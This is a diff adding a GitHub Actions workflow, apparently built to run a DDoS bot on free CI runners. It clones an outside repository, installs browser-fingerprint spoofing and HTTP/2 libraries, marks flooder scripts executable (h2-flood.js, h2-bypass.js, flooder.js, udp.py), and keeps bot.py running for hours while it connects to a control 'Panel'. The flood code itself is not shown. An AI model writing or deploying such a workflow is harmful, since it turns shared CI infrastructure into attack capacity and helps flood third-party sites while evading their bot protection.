@@ -1,0 +1,153 @@
+name: SEVER AI STV PREMIUM
+
+on:
+  workflow_dispatch:
+    inputs:
+      duration:
+        description: 'Thoi gian chay Tool'
+        required: false
+        default: '5h40m'
+        type: choice
+        options:
+          - '1h'
+          - '3h'
+          - '5h40m'
+
+jobs:
+  Auto-Run-Bot:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    
+    steps:
+      - name: Setup environment
+        run: |
+          echo "Setup environment"
+          sudo apt-get update -y
+          sudo apt-get install -y python3 python3-pip git curl wget screen
+          
+          curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
+          sudo apt-get install -y nodejs
+          
+          pip3 install "python-socketio[client]" requests 2>/dev/null || pip3 install "python-socketio[client]" requests
+
+      - name: Download source and setup
+        run: |
+          echo "Download source"
+          
+          mkdir -p /tmp/bb
+          cd /tmp/bb
+          
+          git clone https://github.com/Jillianhobaica361/Bb
+          cd Bb
+          
+          # ===== CÀI MODULES NODE.JS =====
+          echo "Installing Node.js dependencies..."
+          
+          if [ ! -f package.json ]; then
+            echo '{"name":"Bb","version":"1.0.0","dependencies":{}}' > package.json
+          fi
+          
+          npm install \
+            puppeteer-real-browser \
+            fingerprint-generator \
+            fingerprint-injector \
+            colors \
+            cluster \
+            child_process \
+            fs \
+            net \
+            tls \
+            hpack \
+            http2 \
+            url \
+            crypto \
+            user-agents \
+            header-generator \
+            fake-useragent \
+            http2-wrapper \
+            axios \
+            https \
+            socks \
+            chalk@4 \
+            node-fetch \
+            util \
+            dns \
+            --save
+          
+          echo "Checking installed modules..."
+          npm list --depth=0
+          
+          # ===== CHMOD +X =====
+          echo "Setting execute permissions..."
+          chmod +x raw 2>/dev/null || echo "raw not found"
+          chmod +x firefox 2>/dev/null || echo "firefox not found"
+          chmod +x h2-bypass.js 2>/dev/null || echo "BYPASS.js not found"
+          chmod +x bypassv1.js 2>/dev/null || echo "BYPASSV1.js not found"
+          chmod +x h2-browser.js 2>/dev/null || echo "BROWSER.js not found"
+          chmod +x h2-flood.js 2>/dev/null || echo "H2-FLOOD.js not found"
+          chmod +x h2-zentra.js 2>/dev/null || echo "H2-PID.js not found"
+          chmod +x flooder.js 2>/dev/null || echo "H2-RAW.js not found"
+          chmod +x h2-tls.js 2>/dev/null || echo "H2-ZENTRA.js not found"
+          chmod +x udp.py 2>/dev/null || echo "udp.py not found"
+          chmod +x setup.sh 2>/dev/null || echo "setup.sh not found"
+          
+          echo "Bot.py already exists in repository"
+
+      - name: Start bot
+        run: |
+          cd /tmp/bb/Bb
+          
+          echo "Starting bot.py"
+          
+          echo "Installed Node.js modules:"
+          npm list --depth=0
+          
+          nohup python3 bot.py > bot.log 2>&1 &
+          echo $! > /tmp/pid.txt
+          
+          sleep 5
+          
+          if pgrep -f "python3 bot.py" > /dev/null; then
+            echo "Bot is running! Connecting to Panel..."
+          else
+            echo "Bot failed to start. Check log:"
+            cat bot.log
+          fi
+
+      - name: Keep alive
+        run: |
+          cd /tmp/bb/Bb
+          
+          DURATION="${{ github.event.inputs.duration }}"
+          if [ "$DURATION" = "1h" ]; then TOTAL_MIN=60;
+          elif [ "$DURATION" = "3h" ]; then TOTAL_MIN=180;
+          else TOTAL_MIN=340; fi
+          
+          TOTAL_SEC=$((TOTAL_MIN * 60))
+          echo "Bot will run for $TOTAL_MIN minutes"
+          
+          tail -f bot.log &
+          
+          while [ $TOTAL_SEC -gt 0 ]; do
+            H=$((TOTAL_SEC / 3600))
+            M=$(( (TOTAL_SEC % 3600) / 60 ))
+            S=$((TOTAL_SEC % 60))
+            printf "\rTime left: %dh %dm %ds | Bot running..." $H $M $S
+            sleep 10
+            TOTAL_SEC=$((TOTAL_SEC - 10))
+          done
+
+      - name: Cleanup
+        if: always()
+        run: |
+          echo "Cleaning up"
+          
+          if [ -f /tmp/pid.txt ]; then
+            PID=$(cat /tmp/pid.txt)
+            kill $PID 2>/dev/null || true
+            rm -f /tmp/pid.txt
+          fi
+          
+          rm -rf /tmp/bb
+          
+          echo "Instance completed!"
